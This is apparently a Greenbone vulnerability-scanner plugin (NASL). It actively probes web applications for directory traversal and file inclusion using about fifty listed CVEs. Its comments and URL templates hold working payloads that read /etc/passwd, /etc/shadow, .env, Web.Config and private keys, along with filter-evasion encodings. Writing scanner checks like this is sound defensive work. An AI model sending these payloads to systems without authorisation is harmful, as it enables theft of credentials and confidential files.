# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.113002");
  script_version("2025-09-19T15:40:40+0000");
  script_tag(name:"last_modification", value:"2025-09-19 15:40:40 +0000 (Fri, 19 Sep 2025)");
  script_tag(name:"creation_date", value:"2017-09-26 10:00:00 +0200 (Tue, 26 Sep 2017)");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:N/A:N");

  # nb:
  # - Unlike other VTs we're using the CVEs line by line here for easier addition of new CVEs / to
  #   avoid too large diffs when adding a new CVE
  # - A CVSSv2 score above is used which is not necessarily the scoring attached to the CVEs below.
  #   This was done on purpose as some have some too high or wrong scoring (e.g. some have a A:H
  #   attached) currently
  script_cve_id("CVE-2005-3947",
                "CVE-2009-3151",
                "CVE-2010-0759",
                "CVE-2010-0760",
                "CVE-2011-10009",
                "CVE-2014-125125",
                "CVE-2018-14957",
                "CVE-2018-25113",
                "CVE-2019-7254",
                "CVE-2020-13886",
                "CVE-2021-21234",
                "CVE-2021-41291",
                "CVE-2022-26271",
                "CVE-2023-22047",
                "CVE-2023-38879",
                "CVE-2023-49031",
                "CVE-2024-10100",
                "CVE-2024-21136",
                "CVE-2024-26291",
                "CVE-2024-26293",
                "CVE-2024-27292",
                "CVE-2024-3234",
                "CVE-2024-34470",
                "CVE-2024-36527",
                "CVE-2024-40422",
                "CVE-2024-45241",
                "CVE-2024-5334",
                "CVE-2024-55457",
                "CVE-2024-56198",
                "CVE-2024-5926",
                "CVE-2024-6911",
                "CVE-2024-7928",
                "CVE-2025-10708",
                "CVE-2025-10709",
                "CVE-2025-1743",
                "CVE-2025-24963",
                "CVE-2025-27956",
                "CVE-2025-28367",
                "CVE-2025-3021",
                "CVE-2025-31131",
                "CVE-2025-34031",
                "CVE-2025-34047",
                "CVE-2025-34048",
                "CVE-2025-44137",
                "CVE-2025-46002",
                "CVE-2025-47423",
                "CVE-2025-50971",
                "CVE-2025-55526",
                "CVE-2025-7488",
                "CVE-2025-7625"
               );

  script_name("Generic HTTP Directory Traversal / File Inclusion (Web Application URL Parameter) - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning",
                      "global_settings/disable_generic_webapp_scanning");

  script_xref(name:"URL", value:"https://owasp.org/www-community/attacks/Path_Traversal");
  script_xref(name:"URL", value:"https://wiki.owasp.org/index.php/Path_Traversal");
  script_xref(name:"URL", value:"http://projects.webappsec.org/w/page/13246952/Path%20Traversal");
  script_xref(name:"URL", value:"https://owasp.org/www-community/vulnerabilities/PHP_File_Inclusion");

  script_tag(name:"summary", value:"Generic check for HTTP directory traversal / file inclusion
  vulnerabilities within URL parameters of the remote web application.");

  script_tag(name:"vuldetect", value:"Sends various crafted HTTP requests to previously spidered URL
  parameters (e.g. /index.php?parameter=directory_traversal) of a web application and checks the
  responses.

  Note: Due to the long expected run time of this VT it is currently not enabled / running by
  default. Please set the 'Enable generic web application scanning' setting within the VT
  'Global variable settings' (OID: 1.3.6.1.4.1.25623.1.0.12288) to 'yes' if you want to run this
  script.");

  script_tag(name:"impact", value:"Successfully exploiting this issue may allow an attacker to
  access paths, files or directories that should normally not be accessible by a user. This can
  result in effects ranging from disclosure of confidential information to arbitrary code
  execution.");

  script_tag(name:"affected", value:"The following products are known to be affected by the pattern
  and URL parameters checked in this VT:

  - No CVEs: Sharp Multi-Function Printers, Ncast, UniSharp Laravel File Manager prior to version
  2.2.0, FastBee, Nsfocus, Motic Digital Slide Management System, Symfony profiler (debug mode)

  - CVE-2005-3947: PHP Upload Center

  - CVE-2009-3151: Ultrize TimeSheet 1.2.2

  - CVE-2010-0759, CVE-2010-0760: Joomla! Core Design Scriptegrator plugin

  - CVE-2011-10009: S40 CMS

  - CVE-2014-125125: A10 Networks AX Loadbalancer versions 2.6.1-GR1-P5, 2.7.0 and prior

  - CVE-2018-14957: CMS ISWEB 3.5.3

  - CVE-2018-25113: Dicoogle PACS Web Server version 2.5.0 and possibly earlier

  - CVE-2019-7254: Linear eMerge E3-Series

  - CVE-2020-13886: Intelbras TIP 200, TIP 200 LITE and TIP 300 devices

  - CVE-2021-21234: Spring Boot Actuator Logview

  - CVE-2021-41291: ECOA Building Automation System

  - CVE-2022-26271: 74cmsSE v3.4.1

  - CVE-2023-22047: Oracle PeopleSoft

  - CVE-2023-38879: OS4ED openSIS Classic

  - CVE-2023-49031: Tikit (now Advanced) eMarketing platform 6.8.3.0

  - CVE-2024-10100: binary-husky/gpt_academic version 3.83

  - CVE-2024-21136: Oracle Retail Xstore Office

  - CVE-2024-26291, CVE-2024-26293: AVID Nexis Agent

  - CVE-2024-27292: Docassemble 1.4.53 through 1.4.96

  - CVE-2024-3234: gaizhenbiao/chuanhuchatgpt prior to version 20240305

  - CVE-2024-34470: HSC Mailinspector 5.2.17-3 through v.5.2.18

  - CVE-2024-36527: puppeteer-renderer prior to version 3.3.0

  - CVE-2024-40422, CVE-2024-5334, CVE-2024-5926: stitionai/devika

  - CVE-2024-45241: CentralSquare CryWolf

  - CVE-2024-55457: MasterSAM Star Gate v11

  - CVE-2024-56198: path-sanitizer prior to version 3.1.0

  - CVE-2024-6911: PerkinElmer ProcessPlus

  - CVE-2024-7928: FastAdmin

  - CVE-2025-10708, CVE-2025-10709: Four-Faith Water Conservancy Informatization Platform 1.0

  - CVE-2025-1743: zyx0814 Pichome 2.1.0

  - CVE-2025-24963: Vitest

  - CVE-2025-27956: WebLaudos 24.2 (04)

  - CVE-2025-28367: mojoPortal CMS version 2.9.0.1 and prior

  - CVE-2025-3021: e-solutions e-management

  - CVE-2025-31131: YesWiki prior to version 4.5.2

  - CVE-2025-34031: Moodle LMS Jmol plugin version 6.1 and prior

  - CVE-2025-34047: Leadsec SSL VPN (formerly Lenovo NetGuard)

  - CVE-2025-34048: D-Link DSL-2730U, DSL-2750U, and DSL-2750E ADSL routers with firmware versions
  IN_1.02, SEA_1.04, and SEA_1.07

  - CVE-2025-44137: MapTiler Tileserver-php version 2.0

  - CVE-2025-46002: simogeo/Filemanager version 2.3.0 and prior

  - CVE-2025-47423: Personal Weather Station Dashboard (12_lts)

  - CVE-2025-50971: AbanteCart version 1.4.2 and probably prior

  - CVE-2025-55526: n8n-workflows Main Commit ee25413 and probably prior

  - CVE-2025-7488: JoeyBling SpringBoot_MyBatisPlus

  - CVE-2025-7625: YiJiuSmile kkFileViewOfficeEdit

  Other products might be affected as well.");

  script_tag(name:"solution", value:"Contact the vendor for a solution.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  # nb: Keep in sync with the other gb_generic_http_web_* VTs
  script_timeout(1200);

  exit(0);
}

# nb: We also don't want to run if optimize_test is set to "no"
if( get_kb_item( "global_settings/disable_generic_webapp_scanning" ) )
  exit( 0 );

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("traversal_func.inc");
include("host_details.inc");
include("os_func.inc");
include("list_array_func.inc");

# nb:
# - First one prints out the "final" URLs below
# - Second one only prints out "skipped" URLs like e.g. "c:C:" and the like
DEBUG = FALSE;
DEBUG_SKIPPED = FALSE;

depth = get_kb_item( "global_settings/dir_traversal_depth" );
traversals = traversal_pattern( extra_pattern_list:make_list( "/" ), depth:depth );
files = traversal_files();
count = 0;
max_count = 3;

# nb: Keep the "suffixes", "prefixes" and "file_path_variants" lists in sync with the ones in the
# following:
#
# - 2017/gb_generic_http_web_root_dir_trav.nasl
# - 2021/gb_generic_http_web_dirs_dir_trav.nasl
#
suffixes = make_list(

  "",

  # Oracle GlassFish Server flaw (CVE-2017-1000029) but other environments / technologies might be
  # affected as well
  "/",

  # Kyocera Printer flaws (CVE-2020-23575, CVE-2023-34259) but other environments / technologies
  # might be affected as well
  "%00index.htm",

  # Spring Cloud Config flaw (CVE-2020-5410) but other environments / technologies might be affected
  # as well
  "%23vt/test",

  # PHP < 5.3.4 but other environments / technologies might be affected as well
  "%00"
);

prefixes = make_list(

  "",

  # See e.g.:
  # https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2024-4956
  "%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F",
  # And reverse case for the same
  "%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C%5C",

  # See e.g.:
  # https://medium.com/appsflyerengineering/nginx-may-be-protecting-your-applications-from-traversal-attacks-without-you-even-knowing-b08f882fd43d
  "//////",
  # And reverse case for the same
  "\\\\\\",

  # CVE-2022-27043, see e.g.:
  # https://github.com/jimdx/YEARNING-CVE-2022-27043/blob/main/README.md
  "/%5c",
  # And reverse case for the same
  "/%2f",

  # From:
  # https://github.com/detectify/ugly-duckling/blob/master/modules/crowdsourced/nginx-merge-slashes-path-traversal.json
  "static//////",
  # And reverse case for the same
  "static\\\\\\",

  # Oracle GlassFish Server flaw (CVE-2017-1000029) but other environments / technologies might be
  # affected as well
  "file%3a//",

  # puppeteer-renderer (CVE-2024-36527) and Moodle LMS Jmol plugin (CVE-2025-34031) but other
  # environments / technologies might be affected as well
  "file://"
);

# nb:
# - These two only makes sense:
#   - if we know that the target host is a Windows system OR
#   - it is unknown (will be handled later then with a "continue" in the code below)
# - If similar pattern which are Windows only are getting added here please make sure to also check
#   the "skipping" code below
if( ( os_host_runs( "Windows" ) == "yes" ) ||
    ( os_host_runs( "Windows" ) == "unknown" ) ) {

  prefixes = make_list( prefixes,

    # Seen for Pallets Werkzeug (CVE-2019-14322) on a specific directory but other environments /
    # technologies might be affected in a similar way so it was also added here
    "c:",

    # Another variant which is Windows only
    "file://c:"
  );
}

file_path_variants = make_list(

  # nb: Just e.g. "etc/passwd" or "windows/win.ini" as returned by traversal_files()
  "plain",

  "%2f",

  "\",

  "%5c"
);

port = http_get_port( default:80 );

host = http_host_name( dont_add_port:TRUE );
if( ! cgis = http_get_kb_cgis( port:port, host:host ) )
  cgis = make_list();

# nb:
# - CVE-2024-56198 isn't separately included below as this is a generic flaw which might happen on
#   all URL parameters
# - Those are differently handled because we already know the "injection" points and can use a
#   a placeholder for these
# - The following syntax can be used here:
#   - /manage/log/view?filename=<<file_replace>>&base=<<traversal_replace>>
#     - <<file_replace>> is used to inject a file like "/etc/passwd"
#     - <<traversal_replace>> to inject the traversal pattern like "../../../../../"
#     nb: For this case the "prefix" and "suffix" strings are not used (at least for now)
#   - /mailinspector/public/loader.php?path=<<file_nd_traversal_replace>>
#     - <<file_nd_traversal_replace>> is used to inject the "full" path like "../../../../../../../etc/passwd"
#   - /?UrkCEO/edit&theme=margot&squelette=<<file_nd_traversal_replace>>&style=margot.css
#     - <<file_nd_traversal_replace>>: Same as previously
#   - nb: <<file_replace>> or <<traversal_replace>> alone isn't supported currently
cgis = make_list( cgis,

  # CVE-2024-34470 -> /mailinspector/public/loader.php?path=../../../../../../../etc/passwd
  "/mailinspector/public/loader.php?path=<<file_nd_traversal_replace>>",

  # CVE-2024-36527 -> /html?url=file:///etc/passwd
  "/html?url=<<file_nd_traversal_replace>>",

  # FastAdmin/CVE-2024-7928 -> /index/ajax/lang?lang=..//..//..//..//..//..//etc/passwd or /index/ajax/lang?lang=../../application/database
  "/index/ajax/lang?lang=<<file_nd_traversal_replace>>",

  # CVE-2024-5334 -> /api/get-browser-snapshot?snapshot_path=/etc/passwd and CVE-2024-40422 -> /api/get-browser-snapshot?snapshot_path=../../../../etc/passwd
  "/api/get-browser-snapshot?snapshot_path=<<file_nd_traversal_replace>>",

  # CVE-2024-5926 -> /api/get-project-files/?project_name=../../../../../../../../../../../../etc/passwd
  "/api/get-project-files/?project_name=<<file_nd_traversal_replace>>",

  # CVE-2024-27292 -> /interview?i=/etc/passwd
  "/interview?i=<<file_nd_traversal_replace>>",

  # Sharp MFP -> /installed_emanual_down.html?path=/manual/../../../etc/passwd
  "/installed_emanual_down.html?path=/manual/<<file_nd_traversal_replace>>",

  # CVE-2025-34047 (Leadsec VPN) -> /vpn/user/download/client?ostype=../../../../../../../../../etc/passwd
  "/vpn/user/download/client?ostype=<<file_nd_traversal_replace>>",

  # Ncast -> /developLog/downloadLog.php?name=../../../../etc/passwd
  "/developLog/downloadLog.php?name=<<file_nd_traversal_replace>>",

  # CVE-2009-3151 -> /actions/downloadFile.php?fileName=../../../<somefile>
  "/actions/downloadFile.php?fileName=<<file_nd_traversal_replace>>",

  # CVE-2018-14957 -> /moduli/downloadFile.php?file=oggetto_documenti/../.././<somefile>
  "/moduli/downloadFile.php?file=oggetto_documenti/<<file_nd_traversal_replace>>",

  # Laravel File Manager < 2.2.0 (https://github.com/UniSharp/laravel-filemanager/issues/944) -> /laravel-filemanager/download?working_dir=%2F&type=&file=../../../../.env
  "/laravel-filemanager/download?working_dir=%2F&type=&file=<<file_nd_traversal_replace>>",

  # CVE-2024-6911 -> /ProcessPlus/Log/Download/?filename=..\..\..\..\..\..\Windows\win.ini
  "/ProcessPlus/Log/Download/?filename=<<file_nd_traversal_replace>>",

  # CVE-2024-45241 -> /GeneralDocs.aspx?rpt=../../../../Windows/win.ini
  "/GeneralDocs.aspx?rpt=<<file_nd_traversal_replace>>",

  # FastBee -> /prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd
  "/prod-api/iot/tool/download?fileName=<<file_nd_traversal_replace>>",

  # Nsfocus -> /webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd
  "/webconf/GetFile/index?path=<<file_nd_traversal_replace>>",

  # Motic -> /UploadService/Page/style?f=c:\windows\win.ini
  "/UploadService/Page/style?f=<<file_nd_traversal_replace>>",

  # CVE-2023-49031 (https://github.com/Yoshik0xF6/CVE-2023-49031) -> /DATA/Log/OpenLogFile?filename=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Chosts
  "/DATA/Log/OpenLogFile?filename=<<file_nd_traversal_replace>>",

  # CVE-2024-55457 (https://github.com/h13nh04ng/CVE-2024-55457-PoC) -> /adama/adama/downloadService?type=1&file=../../../../etc/passwd
  "/adama/adama/downloadService?type=1&file=<<file_nd_traversal_replace>>",

  # CVE-2024-3234 -> /file=web_assets/../config.json
  "/file=web_assets/<<file_nd_traversal_replace>>",

  # CVE-2024-10100 -> /file=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
  "/file=<<file_nd_traversal_replace>>",

  # CVE-2019-7254 -> /?c=../../../../../../etc/passwd%00
  "/?c=<<file_nd_traversal_replace>>",

  # CVE-2005-3947 (https://web.archive.org/web/20051228065244/https://liz0.3yr.net/phpuploadcenter.txt) -> /index.php?action=view&filename=../../../../../../../../../../../../../../../../etc/passwd
  "/index.php?action=view&filename=<<file_nd_traversal_replace>>",

  # CVE-2022-26271 (https://github.com/N1ce759/74cmsSE-Arbitrary-File-Reading/issues/1) -> /index/download/index?name=index.php&url=../../../../../../../Windows/win.ini
  "/index/download/index?name=index.php&url=<<file_nd_traversal_replace>>",

  # CVE-2025-24963 (https://github.com/vitest-dev/vitest/security/advisories/GHSA-8gvc-j273-4wm5) -> /__screenshot-error?file=/path/to/any/file
  "/__screenshot-error?file=<<file_nd_traversal_replace>>",

  # Symfony profiler (debug mode) from:
  # https://rahadchowdhury.medium.com/how-to-find-multiple-vulnerabilities-in-symfony-profiler-debug-mode-ccf2c5c7bb9f
  # like e.g.: /app_dev.php/_profiler/open?file=app/config/parameters.yml
  # nb: Posting above writes about logging in / getting a token but it might be possible that some
  # specific configurations / deployments allow a direct access or similar so this was added here.
  "/app_dev.php/_profiler/open?file=<<file_nd_traversal_replace>>",
  "/_profiler/open?file=<<file_nd_traversal_replace>>",

  # CVE-2025-3021 (https://www.incibe.es/en/incibe-cert/notices/aviso/multiple-vulnerabilities-e-management-e-solutions) -> "the 'file' parameter in the /downloadReport.php endpoint" -> /downloadReport.php?file=/path/to/any/file
  "/downloadReport.php?file=<<file_nd_traversal_replace>>",

  # CVE-2025-1743 (https://github.com/sheratan4/cve/issues/4) -> /index.php?mod=textviewer&src=file:///etc/passwd
  "/index.php?mod=textviewer&src=<<file_nd_traversal_replace>>",

  # CVE-2023-22047 (https://github.com/tuo4n8/CVE-2023-22047) -> /RP?wsrp-url=file:///etc/passwd or /RP?wsrp-url=file:///c:\\windows\\win.ini
  "/RP?wsrp-url=<<file_nd_traversal_replace>>",

  # CVE-2025-31131 (https://github.com/YesWiki/yeswiki/security/advisories/GHSA-w34w-fvp3-68xm) -> /?UrkCEO/edit&theme=margot&squelette=..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&style=margot.css
  # nb:
  # - A patched system is answering with "ERROR: Suspicious path traversal attempt."
  # - So while the URL includes "edit" it seems that this is an unauthenticated flaw (also confirmed
  #   by the PR:N in the CVSS metrics)
  "/?UrkCEO/edit&theme=margot&squelette=<<file_nd_traversal_replace>>&style=margot.css",

  # CVE-2010-0759 and CVE-2010-0760 (https://www.exploit-db.com/exploits/11498), e.g.:
  # -> /plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=/etc/passwd
  # -> /plugins/system/cdscriptegrator/libraries/jquery/js/ui/jsloader.php?file=/etc/passwd
  # -> /plugins/system/cdscriptegrator/libraries/jquery/js/ui/jsloader.php?files[]=/etc/passwd
  #
  # nb: As the "jsloader.php" might not be Joomla! Plugin specific the more generic path is also checked
  "/plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php?files[]=<<file_nd_traversal_replace>>",
  "/plugins/system/cdscriptegrator/libraries/jquery/js/ui/jsloader.php?file=<<file_nd_traversal_replace>>",
  "/plugins/system/cdscriptegrator/libraries/jquery/js/ui/jsloader.php?files[]=<<file_nd_traversal_replace>>",
  "/highslide/js/jsloader.php?files[]=<<file_nd_traversal_replace>>",
  "/jquery/js/ui/jsloader.php?file=<<file_nd_traversal_replace>>",
  "/jquery/js/ui/jsloader.php?files[]=<<file_nd_traversal_replace>>",

  # CVE-2025-28367 (https://www.0xlanks.me/blog/cve-2025-28367-advisory/) -> /api/BetterImageGallery/imagehandler?path=../../../../Web.Config
  "/api/BetterImageGallery/imagehandler?path=<<file_nd_traversal_replace>>",

  # CVE-2024-21136 (https://www.synacktiv.com/en/advisories/oracle-retail-xstore-suite-pre-authenticated-path-traversal) -> /xstoremgwt/cheetahImages?imageId=..\..\..\..\windows\win.ini
  "/xstoremgwt/cheetahImages?imageId=<<file_nd_traversal_replace>>",

  # CVE-2023-38879 (https://github.com/dub-flow/vulnerability-research/tree/main/CVE-2023-38879) -> /DownloadWindow.php?userfile=Y&name=test&filename=../../../../../../etc/passwd
  "/DownloadWindow.php?userfile=Y&name=test&filename=<<file_nd_traversal_replace>>",

  # CVE-2020-13886 (https://lucxs.medium.com/cve-2020-13886-lfi-voip-intelbras-d30f27a39b22) -> /cgi-bin/cgiServer.exx?page=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
  # nb: There is also CVE-2020-24285 for a "?download=" parameter but it seems this is authenticated
  "/cgi-bin/cgiServer.exx?page=<<file_nd_traversal_replace>>",

  # CVE-2025-27956 (https://github.com/intruderlabs/cvex/blob/main/Pixeon/WebLaudos/Directory-Traversal/README.md) -> /img/img-cache.asp?id=..%2f..%2f..%2f..%2fWindows%2fSystem32%2fdrivers%2fetc%2fhosts
  "/img/img-cache.asp?id=<<file_nd_traversal_replace>>",

  # CVE-2025-47423 (https://github.com/haluka92/CVE-2025-47423) -> /others/_test.php?test=../../../apache/conf/ssl.key/server.key (or any other file)
  "/others/_test.php?test=<<file_nd_traversal_replace>>",

  # CVE-2021-41291 (https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5670.php) -> /fmangersub?cpath=../../<somefile>
  "/fmangersub?cpath=<<file_nd_traversal_replace>>",

  # CVE-2025-34031 (https://www.exploit-db.com/exploits/46881) -> /filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=file:///etc/passwd
  "/filter/jmol/js/jsmol/php/jsmol.php?call=getRawDataFromDatabase&query=<<file_nd_traversal_replace>>",

  # CVE-2021-21234 (https://github.com/pyn3rd/Spring-Boot-Vulnerability) -> /manage/log/view?filename=/etc/passwd&base=../../../../../
  "/manage/log/view?filename=<<file_replace>>&base=<<traversal_replace>>",

  # CVE-2025-34048 (https://www.exploit-db.com/exploits/40735) -> http://TARGET:PORT/cgi-bin/webproc?getpage=/etc/shadow&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:page=wizard
  # nb: This seems to be related to CVE-2017-15647 or CVE-2015-7250 but both seems to require a
  # cookie while this one (See EDB link) doesn't require one. Thus this CVE has been added here
  # instead to cover this in a more generic way.
  "/cgi-bin/webproc?getpage=<<file_nd_traversal_replace>>&errorpage=html/main.html&var:language=en_us&var:menu=setup&var:page=wizard",

  # CVE-2025-7488 (https://github.com/JoeyBling/SpringBoot_MyBatisPlus/issues/18) -> http://localhost/file/download?name=/path/to/file
  "/file/download?name=<<file_nd_traversal_replace>>",

  # CVE-2025-7625 (https://github.com/YiJiuSmile/kkFileViewOfficeEdit/issues/12) -> http://127.0.0.1:8012/download?url=C:/Windows/win.ini
  "/download?url=<<file_nd_traversal_replace>>",

  # CVE-2024-26291 (https://raeph123.github.io/BlogPosts/Avid_Nexis/Advisory_Avid_Nexus_Agent_Multiple_Vulnerabilities_en.html#PoC_2) -> GET /logs?filename=%2Fetc%2fshadow HTTP/1.1
  "/logs?filename=<<file_nd_traversal_replace>>",

  # CVE-2024-26293 (https://raeph123.github.io/BlogPosts/Avid_Nexis/Advisory_Avid_Nexus_Agent_Multiple_Vulnerabilities_en.html#PoC_4) -> GET /../../../../../../../../../../../../../../../../windows/win.ini%00/common/lib/jquery/jquery-1.11.3.min.js
  # nb:
  # - This is a special case, usually this would go to 2017/gb_generic_http_web_root_dir_trav.nasl
  #   but as we have a prefix file it is used here instead
  # - No need to include %00 in the request as this is already getting added via the "suffixes" list
  "/<<file_nd_traversal_replace>>/common/lib/jquery/jquery-1.11.3.min.js",

  # CVE-2025-46002 (https://github.com/zakumini/CVE-List/blob/main/CVE-2025-46002/CVE-2025-46002.md)
  # Seems to depend on the version:
  # <= 2.3.0 -> /filemanager/connectors/php/filemanager.php?mode=preview&path=/....//....//....//....//etc/passwd
  # <= 2.0.0 -> /filemanager/connectors/php/filemanager.php?mode=getinfo&path=/....//....//....//....//etc/passwd
  "/filemanager/connectors/php/filemanager.php?mode=preview&path=<<file_nd_traversal_replace>>",
  "/filemanager/connectors/php/filemanager.php?mode=getinfo&path=<<file_nd_traversal_replace>>",

  # CVE-2018-25113 (https://www.exploit-db.com/exploits/45007) -> http://Target:8080/exportFile?UID=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini
  "/exportFile?UID=<<file_nd_traversal_replace>>",

  # CVE-2025-44137 (https://github.com/mheranco/CVE-2025-44137) -> http://localhost/tileserver.php/x/1/1/1?Format=/../../../../../../../../../../../../../../etc/passwd&Request=x&layer=.
  "/tileserver.php/x/1/1/1?Format=<<file_nd_traversal_replace>>&Request=x&layer=.",

  # CVE-2014-125125 (https://www.exploit-db.com/exploits/31261) -> https://<IP>/xml/downloads/?filename=/a10data/tmp/../../etc/passwd
  "/xml/downloads/?filename=/a10data/tmp/../../<<file_nd_traversal_replace>>",

  # CVE-2011-10009 (https://www.exploit-db.com/exploits/17129) -> /[cms_path]/?p=/../../../../../../../etc/passwd%00
  "/?p=<<file_nd_traversal_replace>>%00",

  # CVE-2025-55526 (https://github.com/Zie619/n8n-workflows/issues/48) -> /api/workflows/..%5c{filename}/download
  # nb: Not directly a web app parameter relevant check but doesn't fit into the existing
  # functionality of 2021/gb_generic_http_web_dirs_dir_trav.nasl so was added here instead.
  "/api/workflows/<<file_nd_traversal_replace>>/download",

  # CVE-2025-50971 (https://github.com/4rdr/proofs/blob/main/info/abantecart_file_traversal_1.4.2_via_template_parameter.md) -> /index.php?rt=r/extension/page_builder/getControllerOutput&pageTemplate=novator&route=blocks%2Fsearch&template=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd&layout_id=21&page_id=0&custom_block_id=0&render_mode=editor
  # nb: CVE description is stating that the flaw is unauthenticated
  "/index.php?rt=r/extension/page_builder/getControllerOutput&pageTemplate=novator&route=blocks%2Fsearch&template=<<file_nd_traversal_replace>>&layout_id=21&page_id=0&custom_block_id=0&render_mode=editor",

  # CVE-2025-10708 (https://github.com/Cstarplus/CVE/issues/4) -> /history/historyDownload.do;usrlogout.do?fileName=../../../some/file
  # CVE-2025-10709 (https://github.com/Cstarplus/CVE/issues/5) -> /history/historyDownload.do;otheruserLogin.do;getfile?fileName=../../../some/file
  # nb: Both GitHub issues shows that the flaws are unauthenticated
  "/history/historyDownload.do;usrlogout.do?fileName=<<file_nd_traversal_replace>>",
  "/history/historyDownload.do;otheruserLogin.do;getfile?fileName=<<file_nd_traversal_replace>>"
);

foreach cgi( cgis ) {

  # nb: Only required for the ones from / returned by http_get_kb_cgis()
  if( cgi !~ "<<.+_replace>>" )
    cgiArray = split( cgi, sep:" ", keep:FALSE );

  # nb: Used later to only report each URL only once
  cgi_vuln = FALSE;

  foreach traversal( traversals ) {

    foreach pattern( keys( files ) ) {

      file = files[pattern];

      foreach suffix( suffixes ) {

        foreach prefix( prefixes ) {

          foreach file_path_variant( file_path_variants ) {

            # nb: Only do modification to the file if any encoding variant has been requested
            if( file_path_variant != "plain" ) {

              # nb: No slash so just continue as this is already covered in the "plain" variant
              if( "/" >!< file )
                continue;

              check_file = str_replace( string:file, find:"/", replace:file_path_variant );

            } else {
              check_file = file;
            }

            if( "<<file_replace>>" >< cgi && "<<traversal_replace>>" >< cgi ) {

              # nb: Only empty ones or the c: variants for Windows for now...
              if( ( prefix == "" && suffix == "" ) ||
                  ( "c:" >< prefix && suffix == "" )
                ) {

                # nb:
                # - Need to add some variants here...
                # - Something like "c:/etc/passwd" will be handled / skipped later so no special
                # handling required here...
                if( "/" >< check_file )
                  check_file = "/" + check_file;
                else if( "%2f" >< check_file )
                  check_file = "%2f" + check_file;
                else if( "%5c" >< check_file )
                  check_file = "%5c" + check_file;
                else if( "\" >< check_file )
                  check_file = "\" + check_file;

                if( "c:" >< prefix )
                  check_file = prefix + check_file;

                tmp_url = str_replace( string:cgi, find:"<<file_replace>>", replace:check_file );
                tmp_url = str_replace( string:tmp_url, find:"<<traversal_replace>>", replace:traversal );
                urls = make_list( tmp_url );
              } else {

                # nb: Just for the reporting...
                if( ! prefix )
                  rep_prefix = "empty";
                else
                  rep_prefix = prefix;

                if( ! suffix )
                  rep_suffix = "empty";
                else
                  rep_suffix = suffix;

                if( DEBUG_SKIPPED ) display( "Skipping prefix '" + rep_prefix + "' / suffix '" + rep_suffix + "' for the following CGI for now: " + string( cgi ) );
                continue;
              }
            }

            # nb: Unlike for the above we don't need much special handling for this one
            else if( "<<file_nd_traversal_replace>>" >< cgi ) {
              tmp_url = str_replace( string:cgi, find:"<<file_nd_traversal_replace>>", replace:prefix + traversal + check_file + suffix );
              urls = make_list( tmp_url );
            }

            # nb: This is currently not supported (doesn't make much sense for our purpose...)
            else if( ( "<<file_replace>>" >< cgi && "<<traversal_replace>>" >!< cgi ) ||
                     ( "<<file_replace>>" >!< cgi && "<<traversal_replace>>" >< cgi ) ) {
              if( DEBUG_SKIPPED ) display( "Skipping the following CGI entry as it only contains one <<file_replace>> or <<traversal_replace>> placeholder but both are required: " + string( cgi ) );
              continue;
            }

            # nb: Standard for the ones from http_get_kb_cgis()
            else {
              exp = prefix + traversal + check_file + suffix;
              urls = http_create_exploit_req( cgiArray:cgiArray, ex:exp );
            }

            foreach url( urls ) {

              # nb:
              # - For the file we need a regex as there might be e.g. etc%5cpasswd included
              # - Kept before the next traversal pattern check on purpose
              if( file =~ "etc.+passwd" && ( prefix == "c:" || prefix == "file://c:" ) ) {
                if( DEBUG_SKIPPED ) display( "Skipping URL (Windows only prefix and Linux file): " + string( url ) );
                continue;
              }

              if( "C:../" >< traversal && ( prefix == "c:" || prefix == "file://c:" ) ) {
                if( DEBUG_SKIPPED ) display( "Skipping URL (As it e.g. would cause a duplicated 'c:C:.../'): " + string( url ) );
                continue;
              }

              if( DEBUG ) display( "Final URL to test: " + string( url ) );

              req = http_get( port:port, item:url );
              res = http_keepalive_send_recv( port:port, data:req );

              if( egrep( pattern:pattern, string:res, icase:TRUE ) ) {
                count++;
                cgi_vuln = TRUE;
                vuln += http_report_vuln_url( port:port, url:url ) + '\n\n';
                vuln += 'Request:\n' + chomp( req ) + '\n\nResponse:\n' + chomp( res ) + '\n\n\n';
                break; # Don't report multiple vulnerable parameter / pattern / suffixes / prefixes for the very same URL
              }
            }
            if( count >= max_count || cgi_vuln )
              break; # nb: No need to continue with that much findings or with multiple vulnerable parameter / pattern / suffixes / prefixes for the very same URL
          }
          if( count >= max_count || cgi_vuln )
            break;
        }
        if( count >= max_count || cgi_vuln )
          break;
      }
      if( count >= max_count || cgi_vuln )
        break;
    }
    if( count >= max_count || cgi_vuln )
      break;
  }
  if( count >= max_count )
    break;
}

if( vuln ) {
  report = 'The following affected URL(s) were found (limited to ' + max_count + ' results):\n\n' + chomp( vuln );
  security_message( port:port, data:report );
  exit( 0 );
}

